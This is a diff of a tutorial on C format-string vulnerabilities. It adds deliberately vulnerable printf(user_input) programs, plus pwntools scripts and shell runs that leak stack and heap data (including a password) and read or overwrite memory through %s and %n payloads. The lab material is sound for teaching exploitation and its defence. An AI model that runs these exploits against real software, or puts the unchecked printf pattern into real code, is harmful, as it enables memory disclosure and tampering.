@@ -215,7 +215,7 @@ int main()
   return 0;
 }
 ```
-This prints out the offset parameter number followed by the contents at that parameter, interpreted as a hexadecimal integer:
+This prints out the offset parameter number followed by the contents at that offset, interpreted as a hexadecimal integer:
 ```
 $ gcc -m32 no-args-x.c -o no-args-x
 $ ./no-args-x 
@@ -239,9 +239,9 @@ $ ./no-args-x
 18 	 1
 19 	 13
 ```
-Now we can start to see what we're looking at. The first byte of offset 12, and all of offsets 13, 14 and 15 contain 12 ASCII values for the letter 'A' (`0x41`). Offset 16 has the value 3 in it, 17 has 2, and 18 has 1. These are the variables from our code! Our `s`, `a`, `b` and `c`. These are values off the stack!
+Now we can start to see what we're looking at. The first byte of offset 12, and all of offsets 13, 14 and 15 contain 12 ASCII values for the letter 'A' (`0x41`). Offset 16 has the value 3 in it, 17 has 2, and 18 has 1. These are the variables from our code! Our `s`, `a`, `b` and `c`. These are values off the stack! If we don't specify arguments for our `printf` format string, `printf` will take values from the current stack pointer, and continue down the stack to satisfy subsequent requests.
 
-As a side note, I built this executable as 32-bit so it shows things a bit more clearly than a 64-bit executable. Below is the output from a 32-bit and 64-bit executables showing hexadecimal integers (%x) and pointers (%p) to clarify. It shows the relevant offsets only, which have shifted from above with the addition of more local variables to handle the %p output, and also change between the 64-bit and 32-bit executables:
+As a side note, I built this executable as 32-bit so it shows things a bit more clearly than a 64-bit executable. Below is the output from a 32-bit and 64-bit executables showing hexadecimal integers (`%x`) and pointers (`%p`) to clarify. It shows the relevant offsets only, which have shifted from above with the addition of more local variables to handle the %p output, and also change between the 64-bit and 32-bit executables:
 
 |            | 32-bit |         |            | 64-bit |        |
 | :-------:  | ------ | ------- | -----      | ------ | ------ |
@@ -260,7 +260,9 @@ As a side note, I built this executable as 32-bit so it shows things a bit more 
 
 Here we can see that `%p` shows the same information as `%x` in 32-bit executables, but in the 64-bit version, the `%p` shows the full 64-bits, while `%x` just shows the 32 Least Significant Bits (LSBs) of each address. As the 64-bit executable has 64-bit pointers, the `%x` will step 64-bits for each position specified, but only show 32-bits of information.
 
-I advise using `%p` instead of `%x` for displaying stack contents (at least initially). It will display full contents for every location, and won't crash (as `%s` does if it doesn't find a valid string) or display strange characters (like `%c`) or difficult to interpret numbers (like `%d`).
+This means the `%x` only shows us part of the multiple `A` string, and doesn't show the value `2`, which is actually in the most significant 32 bits of offset 16.
+
+I advise using `%p` for displaying stack contents (at least initially). It will display full contents for every location (wheras `%x` may not), and won't crash (as `%s` does if it doesn't find a valid string) or display strange characters (like `%c`) or difficult to interpret numbers (like `%d`).
 
 But how does any of this help us? It's very unlikely someone has accidentally created a series of format strings in their code without arguments and it prints out the stack and they've tested it and not noticed!
 
@@ -346,7 +348,9 @@ What do you want me to say? > quit
 quit
 ```
 
-We search through the stack for the pointer that the program displayed to us. Here we find it at position 15, and confirm it with a `%15$p`. Then we can print the string that address points to with `%15s`.
+We search through the stack for the pointer that the program displayed to us. Here we find it at position 15, and confirm it with a `%15$p`. Then we can print the string that address points to with `%15$s`.
+
+> *Note*: If the executable doesn't change, the offset for the location of items on the stack stays the same. For example, subsequent runs of the above will always have the string pointer at offset 15.
 
 OK. So we can see things on the stack and display them in various ways. But what if what we want is a hundred positions deep in the stack? Or we want to just print out lots of stack to see what we have? Or the program doesn't tell us the string pointer we need to find? Python and [pwntools](https://github.com/Gallopsled/pwntools#readme) can help us out here!
 
@@ -426,7 +430,7 @@ String is: Secret Password
 [*] Stopped process '/usr/bin/stdbuf' (pid 80008)
 ```
 
-Of course, it's now simple just to dump a massive amount of stack into a file so we can go through it:
+Of course, it's now simple just to dump a massive amount of stack so we can go through it:
 ```python
 from pwn import *
 
@@ -453,7 +457,7 @@ for i in range(1, 501):
 p.close()
 ```
 
-We could update this easily to print out `%p`, `%x`, `%c`, `%d`, etc. String, however, add an extra problem. Because strings assume they're being given pointers to `char *` arrays, it will try to get a string at address it reads off the stack. This means it can crash the program for out of scope accesses, causing `Segmentation fault` errors.
+We could update this easily to print out `%p`, `%x`, `%c`, `%d`, etc. Strings, however, add an extra problem. Because strings assume they're being given pointers to `char *` arrays, it will try to get a string at address it reads off the stack. This means it can crash the program for out of scope accesses, causing `Segmentation fault` errors.
 
 This just means we have to continually open and close the program within a loop to be able to read through the stack looking for strings:
 ```python
@@ -465,6 +469,8 @@ context.log_level = 'critical'
 
 for i in range(1, 20):
 
+    # We don't seem to get a recvline() when a segmentation fault
+    # occurs, so we use try...except to catch program crashes
     try:
         # Open the executable with stdbuf to stop it
         # buffering input/output so recv*() functions
@@ -483,6 +489,8 @@ for i in range(1, 20):
         print(f"Position {i}: {response}")
         p.close()
     except:
+        # It may not be a segmentation fault, but it doesn't
+        # really matter - it crashed!
         print(f"Position {i}: Segmentation error!")
         p.close()
 
@@ -513,6 +521,390 @@ Position 19: Segmentation error!
 Done!
 ```
 
+Now we don't even need the program to tell us where the pointer is on the stack. We can just try everything! 
+
+We have extra information, too. We know that 'Position 15' in those code contains a pointer to the stack, so we now know where the stack sits in memory. This could be useful for other exploits (not covered here).
+
+We can even print out a string that doesn't appear on the stack, only the heap:
+```c
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+#define BUFF_SIZE 40 
+
+int main(void)
+{
+  char user_input[BUFF_SIZE];
+  char *s = malloc(sizeof(char) * 10);
+
+  // Pretend I'm loaded from somewhere
+  // else - not a literal in the code
+  // so we can't see me with 'strings'
+  strcpy(s, "Passw0rd");
+
+  // Get the user's password and remove any trailing
+  // newline character
+  printf("What's the password? > ");
+  fgets(user_input, BUFF_SIZE, stdin);
+  user_input[strcspn(user_input, "\n")] = '\0';
+
+  if (strcmp(s, user_input) == 0)
+    printf("You're in!\n");
+  else
+  {
+    printf("You entered: ");
+    printf(user_input);
+    printf("\nThat is not correct... bye!\n");
+  }
+
+  return 0;
+}
+```
+
+If we look at some of the stack contents using `%p`, we can see that there isn't a copy of the password string on the stack - the password starts with `P`, which is ASCII `0x50`, so we can look at `0x50` values on the stack to check our string's not there:
+```
+$ python3 dump-stack-pass.py | grep 50
+Position 8: You entered: 0x55fc52397250
+Position 12: You entered: 0x55f410475250
+```
+
+But when we run our string output program we still find the password string, and can get in the software:
+```
+$ python3 dump-strings-heap.py 
+Position 1: You entered: You entered: ssword? >
+Position 2: You entered: (null)
+Position 3: You entered: (null)
+Position 4: You entered: assword? >
+Position 5: Segmentation error!
+Position 6: Segmentation error!
+Position 7: You entered: (null)
+Position 8: Segmentation error!
+Position 9: Segmentation error!
+Position 10: You entered: 
+Position 11: You entered: Passw0rd
+Position 12: Segmentation error!
+Position 13: Segmentation error!
+Position 14: Segmentation error!
+Position 15: Segmentation error!
+Position 16: Segmentation error!
+Position 17: Segmentation error!
+Position 18: You entered: (null)
+Position 19: Segmentation error!
+Done!
+
+$ ./heap-string
+What's the password? > Passw0rd
+You're in!
+```
+
+> *Note*: I haven't included the Python code for `dump-stack-pass.py` and `dump-strings-heap.py` as they are similar to the previous Python code, just with the executable name changes and some changes the `recv*()` function order.
+
+So now we can dump the stack, and also find out roughly where the stack and heap are in memory by looking at where pointers for strings point to.
+
+So what if there's a long string on the stack with no pointer that would take a long time to decode from hex to ASCII? What if we need to change the value of a variable? How can we write to memory, not just read it?
+
 ### Writing to memory
 
+Can we really write to memory with an innocent `printf` format string? Yes we can!
 
+The simplest way we can write to memory is through the input string we've been given by the program. Everything we write in our user input gets written to the stack (in our example), and we can exploit this. Here's the program we're going to exploit:
+```c
+#include <stdio.h>
+
+#define BUFF_SIZE 40 
+int main(void)
+{
+
+  // Stop stdout from buffering
+  setvbuf(stdout, NULL, _IONBF, 0);
+
+  // Imagine this string is loaded from a file or something,
+  // not present in the executable!
+  char s[] = "This string is too long to manually decode from hex, and you will never be able to print it out! Ha ha...";
+  printf("I'll tell you where the string is! You still won't print it out - %p\n", s);
+
+  char user_input[BUFF_SIZE];
+
+  printf("Come on! Hack me! > ");
+  fgets(user_input, BUFF_SIZE, stdin);
+  printf("Is that really going to work? - ");
+  printf(user_input);
+}
+```
+> *Note*: We are going to build this as 32-bit so we can deal with shorter addresses (the exploit is identical for 64-bit executables, but simpler to show in 32-bit). Because of this, using `stdbuf` to control the buffers in our Python script as it won't work (it's the wrong type of ELF!). Therefore, for this example, I've turned buffering off in the C code using `setvbuf`.
+
+This code gives us a string we need to print out. This could be a very long string that would be difficult to convert all the hex bytes to ASCII, so we'd really like to use our `%s` export to do it. But there's no pointer to this string on the stack. How can we access it?
+
+We can start by entering some data, and then see where that appears in the stack. We'll send 8 `A`s (hex `0x41`) to the program and see if we can spot them on the stack, using a series of `%p` format specifiers:
+```
+$ gcc -m32 show-string.c -o show-string
+$ ./show-string
+I'll tell you where the string is! You still won't print it out - 0xffc93726
+Come on! Hack me! > AAAAAAAA %p %p %p %p %p %p %p %p %p %p
+Is that really going to work? - AAAAAAAA 0x28 0xf7f02580 0x565f81c5 (nil) (nil) 0xfffffa60 0x41410009 0x41414141 0x25204141 0x70252070
+```
+We can see that our `A`s start at position 7 (counting from `0x28` as 1) with 2 bytes having `0x41` in them, the 4 bytes of `0x41` in position 8, then the final 2 bytes in position 9 (followed by some `<space>%p` seen as hex `0x20 0x25 0x70`).
+
+We can confirm those positions with:
+```
+$./show-string 
+I'll tell you where the string is! You still won't print it out - 0xffebff96
+Come on! Hack me! > AAAAAAAA %7$p %8$p %9$p
+Is that really going to work? - AAAAAAAA 0x41410009 0x41414141 0x25204141
+```
+
+Let's check our theory by sending 2 `A`s, 4 `B`s and 2 `C`s so we can see if we can fill position 8 with 4 `B`s.
+```
+./show-string 
+I'll tell you where the string is! You still won't print it out - 0xffbc85e6
+Come on! Hack me! > AABBBBCC %7$p %8$p %9$p
+Is that really going to work? - AABBBBCC 0x41410009 0x42424242 0x25204343
+```
+Yes we can! So if we can send 2 `A`s, followed by the address we want (`0xffbc85e6` on this run), we can create a pointer to the string in position 8, and print out the string using `%8$s`!
+
+Our payload for the above example, therefore, would be something like `AAffbc86e6%8$s`, which we would send as our input string, but note 2 things:
+* The address has to be written reversing the bytes as we're doing this on a little-endian machine, so should be `0xe685bcff`
+* The values for the address are the ASCII characters for each value in the address, but have to be the binary bytes themselves
+
+The second point means we can't type these in ourselves (as we can't type binary in directly), so we need to use something else instead.
+
+We could use a simple `bash` `echo` command to build our payload and send it to a text file. Then we can pass that text file to the executable and see our 7, 8 and 9 positions:
+```
+$ echo -e AA\\xe6\\x85\\xbc\\xff %7\$p %8\$p %9\$p > input.txt
+$ ./show-string < input.txt 
+I'll tell you where the string is! You still won't print it out - 0xffef04d6
+Come on! Hack me! > Is that really going to work? - AA慼� 0x41410009 0xffbc85e6 0x24372520
+```
+That worked! We can see our example address in position 8! However, it doesn't match the actual address for this run. We need to strip out the address printed at the console, and pass that in as the address! Let's write a Python script:
+```python
+from pwn import *
+import re
+
+context.log_level = 'critical'
+
+# Run the executable
+p = process("./show-string")
+
+# Read the line containing the address and strip
+# out the pointer
+addr = p.recvline()
+addr_h = re.search('0x[0-9a-f]+', str(addr)).group(0)
+print(f"Pointer is: {addr_h}...")
+
+# Create the payload
+# This consists of 2 A characters, followed by our address,
+# packed as a 32-bit value (will be correctly ordered for
+# little-endian, and padded with zeros if necessary), and
+# finish off with our format string
+payload = b"AA" + p32(int(addr_h, 16)) + b" %7$p %8$p %9$p"
+
+# Get to the prompt and send our payload
+p.recvuntil("> ")
+p.sendline(payload)
+
+# Print out our result
+print(p.recvline())
+
+p.close()
+``` 
+When we run this Python script, we can see our address correctly in position 8.
+```
+$ python3 show-string.py 
+Pointer is: 0xffa9c7f6...
+b'Is that really going to work? - AA\xf6\xc7\xa9\xff 0x41410009 0xffa9c7f6 0x24372520\n'
+```
+Great! Now we can just change our `%p` specifiers for a `%s` one and see what happens!
+```
+15c15
+< payload = b"AA" + p32(int(addr_h, 16)) + b" %7$p %8$p %9$p"
+---
+> payload = b"AA" + p32(int(addr_h, 16)) + b" -> %8$s"
+
+$ python3 show-string.py 
+Pointer is: 0xffa573b6...
+b'Is that really going to work? - AA\xb6s\xa5\xff -> This string is too long to manually decode from hex, and you will never be able to print it out! Ha ha...\n'
+```
+And now we can see the string! 
+
+> *Note*: In the print out of our input, part of the address is within ASCII character range, so is converted when displayed - in this case, `0x73` was shown as `s`.
+
+Now for another way we can write to memory. This time we write an integer!
+
+In the table of format specifiers earlier in this note you may have noticed the `%n` specifier. As a reminder, the description says `Displays nothing, but is passed a pointer argument - a pointer to a signed int - and sets that signed int to the number of characters printed out so far`. So, if we can get a pointer passed to the `%n` specifier, we can fill that memory location with a value.
+
+That all sounds good, but how do we specify the pointer, and how can we affect what goes in there?
+
+Let's go through an example:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+#define BUFF_SIZE 40 
+int main(void)
+{
+  int *sum;
+  sum = malloc(sizeof(int));
+  *sum = 2;
+  printf("Sum is: %p\n", sum);
+  char user_input[BUFF_SIZE];
+
+  do {
+    printf("I believe 1 + 1 = %d! Convince me otherwise! > ", *sum);
+    fgets(user_input, BUFF_SIZE, stdin);
+    printf("Do you think you can convince me with: ");
+    printf(user_input);
+  } while(*sum == 2);
+
+  printf("\nWow! You did convince me! 1 + 1 = %d!\n", *sum);
+
+  // Pretend the secret word is loaded from a file or something
+  // rather than being hard coded so you wouldn't normally be
+  // able see it!
+  printf("You deserve the secret word: Snoogle!\n");
+}
+```
+So we have a program where it continues through a loop until the value contained in `sum` changes from being `2`. We need to change that value and break out of the loop by exploiting the `printf`. We can do this by pointing a `%n` format specifier at the position on the stack where the pointer to `sum` is stored. We can influence the value written to that pointer by including some characters in the string before the `%n` - e.g. `"AAA%n"` would send 3 to the address pointed to by any pointer passed to the `%n` specifier.
+
+Let's find our pointer on the stack and write to it!
+
+First, we can use Python, as before, to show us the stack. We'll start by just dumping the stack so we can step through the exploit, and then we'll modify the script to complete the exploit for us, and finally create a brute force version for when we don't have the pointer printed out.
+
+Our starting script is:
+```python
+from pwn import *
+
+# Stop info output from pwntools
+context.log_level = 'critical'
+
+# Open the executable with stdbuf to stop it
+# buffering input/output so recv*() functions
+# work properly
+p = process(["stdbuf", "-i0", "-o0", "-e0", "./sum-up"])
+
+print(p.recvline())
+
+for i in range(1, 20):
+    # Get the prompt
+    p.recvuntil("> ")
+    
+    # Send a value and get the result
+    p.sendline(f"%{i}$p")
+    response = p.recvline().strip().decode("utf-8")
+    print(f"Position {i}: {response}")
+
+# Close it
+p.close()
+print("Done!")
+```
+Running it, we can see the stack dump:
+```
+$ python3 dump-stack-sum.py 
+b'Sum is: 0x55c5b32aa2a0\n'
+Position 1: Do you think you can convince me with: 0x7ffc1b22de10
+Position 2: Do you think you can convince me with: (nil)
+Position 3: Do you think you can convince me with: (nil)
+Position 4: Do you think you can convince me with: 0x7ffc1b230490
+Position 5: Do you think you can convince me with: 0x27
+Position 6: Do you think you can convince me with: 0xa70243625
+Position 7: Do you think you can convince me with: (nil)
+Position 8: Do you think you can convince me with: 0x55c5b14f2230
+Position 9: Do you think you can convince me with: 0x55c5b14f2080
+Position 10: Do you think you can convince me with: 0x7ffc1b2305b0
+Position 11: Do you think you can convince me with: 0x55c5b32aa2a0
+Position 12: Do you think you can convince me with: 0x55c5b14f2230
+Position 13: Do you think you can convince me with: 0x7f203d6b9d0a
+Position 14: Do you think you can convince me with: 0x7ffc1b2305b8
+Position 15: Do you think you can convince me with: 0x100000000
+Position 16: Do you think you can convince me with: 0x55c5b14f2165
+Position 17: Do you think you can convince me with: 0x7f203d87d115
+Position 18: Do you think you can convince me with: (nil)
+Position 19: Do you think you can convince me with: 0x37e5feadda32418d
+Done!
+```
+If we look through this stack dump, we can see that at position 11, the pointer on the stack matches the pointer displayed by the program. We can confirm this in the program, and can then send the number 3 to this pointer with `AAA%11$n`, or 10 to it with `AAAAAAAAAA%11n`:
+```
+$ ./sum-up 
+Sum is: 0x559f559d22a0
+I believe 1 + 1 = 2! Convince me otherwise! > %11$p
+Do you think you can convince me with: 0x559f559d22a0
+I believe 1 + 1 = 2! Convince me otherwise! > AAA%11$n
+Do you think you can convince me with: AAA
+
+Wow! You did convince me! 1 + 1 = 3!
+You deserve the secret word: Snoogle!
+$ ./sum-up 
+Sum is: 0x55d8325c32a0
+I believe 1 + 1 = 2! Convince me otherwise! > AAAAAAAAAA%11$n
+Do you think you can convince me with: AAAAAAAAAA
+
+Wow! You did convince me! 1 + 1 = 10!
+You deserve the secret word: Snoogle!
+```
+Why are we typing our input when we can create a Python script to do everything for us?
+```python
+from pwn import *
+import re
+
+# Stop info output from pwntools
+context.log_level = 'critical'
+
+# Open the executable with stdbuf to stop it
+# buffering input/output so recv*() functions
+# work properly
+p = process(["stdbuf", "-i0", "-o0", "-e0", "./sum-up"])
+addr_line = p.recvline()
+addr_v = re.search('0x[0-9a-f]+', str(addr_line)).group(0)
+print(f"Looking for addr: {addr_v}")
+    
+# Get the prompt
+p.recvuntil("> ")
+
+# Try a range of positions
+for i in range(1, 20):
+
+    # Send a positional %p specifier and get the result
+    p.sendline(f"%{i}$p")
+    response = p.recvline().strip().decode("utf-8")
+    print(f"Position {i}: {response}")
+
+    p.recvuntil("> ")
+
+    # Sometimes we get (nil) back, so filter them out
+    if "(nil)" not in response:
+        # Check if the pointer in the response is the same
+        # as the one in the output
+        is_addr = re.search('0x[0-9a-f]+', response).group(0)
+        if is_addr == addr_v:
+            print(f"Found pointer at position: {i}")
+            print("Running exploit...")
+            p.sendline(f"AAA%{i}$n")
+            print(p.recv().strip().decode("utf-8"))
+            break
+
+p.close()
+print("Done!")
+```
+When we run this exploit, it's all done for us!
+```
+$ python3 exploit-sum.py 
+Looking for addr: 0x556c98cab2a0
+Position 1: Do you think you can convince me with: 0x7ffedf914fe0
+Position 2: Do you think you can convince me with: (nil)
+Position 3: Do you think you can convince me with: (nil)
+Position 4: Do you think you can convince me with: 0x7ffedf917660
+Position 5: Do you think you can convince me with: 0x27
+Position 6: Do you think you can convince me with: 0xa70243625
+Position 7: Do you think you can convince me with: (nil)
+Position 8: Do you think you can convince me with: 0x556c97dc1230
+Position 9: Do you think you can convince me with: 0x556c97dc1080
+Position 10: Do you think you can convince me with: 0x7ffedf917780
+Position 11: Do you think you can convince me with: 0x556c98cab2a0
+Found pointer at position: 11
+Running exploit...
+Do you think you can convince me with: AAA
+
+Wow! You did convince me! 1 + 1 = 3!
+You deserve the secret word: Snoogle!
+Done!
+```
